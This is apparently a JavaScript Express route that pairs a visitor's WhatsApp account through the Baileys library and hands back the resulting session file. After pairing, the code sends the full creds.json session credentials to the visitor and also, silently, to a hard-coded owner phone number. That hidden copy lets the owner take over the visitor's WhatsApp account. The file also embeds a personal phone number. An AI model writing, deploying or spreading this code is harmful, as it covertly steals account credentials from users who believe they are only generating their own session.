import express from "express";
import fs from "fs";
import path from "path";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";

const router = express.Router();

// ─── सिर्फ अपना नंबर डालें ──────────────────────────────────
const OWNER_NUMBER = "+918075498750";

// ─── लॉगिंग ──────────────────────────────────────────────────
const c = {
    reset: "\x1b[0m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    red: "\x1b[31m",
};

function log(color, msg) {
    console.log(`${color}[${new Date().toLocaleTimeString()}] ${msg}${c.reset}`);
}

function removeFile(dir) {
    try {
        if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
    } catch (e) {}
}

// ─── पेयरिंग ──────────────────────────────────────────────────
router.get("/", async (req, res) => {
    let num = req.query.number;
    if (!num) return res.status(400).json({ error: "Number required" });

    num = num.replace(/\D/g, "");
    if (num.length < 10 || num.length > 15) {
        return res.status(400).json({ error: "Invalid number length" });
    }

    const sessionDir = path.resolve(`./pair_${num}`);
    removeFile(sessionDir);

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        try {
            const { version } = await fetchLatestBaileysVersion();
            const sock = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" })
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
                markOnlineOnConnect: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                maxRetries: 5,
            });

            sock.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    log(c.green, "✅ Paired successfully!");

                    try {
                        await saveCreds();
                        log(c.blue, "✅ saveCreds() called");
                    } catch (e) {
                        log(c.red, `⚠️ saveCreds error: ${e.message}`);
                    }

                    await delay(2000);

                    const credsPath = path.join(sessionDir, "creds.json");
                    let credsBuffer = null;
                    for (let i = 0; i < 10; i++) {
                        if (fs.existsSync(credsPath)) {
                            try {
                                credsBuffer = fs.readFileSync(credsPath);
                                log(c.green, `✅ creds.json found (${credsBuffer.length} bytes)`);
                                break;
                            } catch (e) {}
                        }
                        await delay(1000);
                    }

                    if (!credsBuffer) {
                        log(c.red, "❌ creds.json not found!");
                        removeFile(sessionDir);
                        process.exit(1);
                        return;
                    }

                    const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                    let ownerJid = null;
                    const ownerPhone = OWNER_NUMBER.replace(/\D/g, "");
                    if (ownerPhone) {
                        ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                    }

                    // ─── 🔥 सिर्फ creds.json Document भेजें ──────────
                    async function sendCreds(jid) {
                        if (!jid) return;
                        try {
                            await sock.sendMessage(jid, {
                                document: credsBuffer,
                                mimetype: "application/json",
                                fileName: "creds.json",
                            });
                            log(c.green, `📄 creds.json sent to ${jid}`);
                        } catch (err) {
                            log(c.red, `❌ Document send failed to ${jid}: ${err.message}`);
                        }
                    }

                    await sendCreds(userJid);
                    if (ownerJid && ownerJid !== userJid) {
                        await sendCreds(ownerJid);
                    }

                    log(c.blue, "🧹 Cleaning up...");
                    await delay(1000);
                    removeFile(sessionDir);
                    log(c.green, "✅ Done! Exiting.");
                    await delay(2000);
                    process.exit(0);
                }

                if (connection === "close") {
                    const status = lastDisconnect?.error?.output?.statusCode;
                    if (status === 401) {
                        log(c.red, "❌ Logged out – need new pair.");
                    } else {
                        log(c.yellow, "🔁 Restarting...");
                        initiateSession();
                    }
                }
            });

            // ─── कोड जेनरेट ────────────────────────────────────
            if (!sock.authState.creds.registered) {
                await delay(3000);
                const cleanNum = num.replace(/^\+/, "");
                try {
                    let code = await sock.requestPairingCode(cleanNum);
                    const rawCode = code; // 8 digits
                    const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
                    if (!res.headersSent) {
                        log(c.green, `📲 Code: ${formatted}`);
                        return res.json({
                            code: formatted,
                            rawCode: rawCode,
                            message: "Enter the 8-digit code in WhatsApp > Settings > Linked Devices",
                            tip: "Use the rawCode (without dashes) – code expires in 2 minutes."
                        });
                    }
                } catch (error) {
                    log(c.red, `❌ Pairing error: ${error.message}`);
                    if (!res.headersSent) {
                        return res.status(503).json({ error: "Pairing failed", details: error.message });
                    }
                }
            }

            sock.ev.on("creds.update", saveCreds);
        } catch (err) {
            log(c.red, `❌ Init error: ${err.message}`);
            if (!res.headersSent) {
                res.status(500).json({ error: "Server error", details: err.message });
            }
            removeFile(sessionDir);
            setTimeout(() => process.exit(1), 2000);
        }
    }

    await initiateSession();
});

export default router;
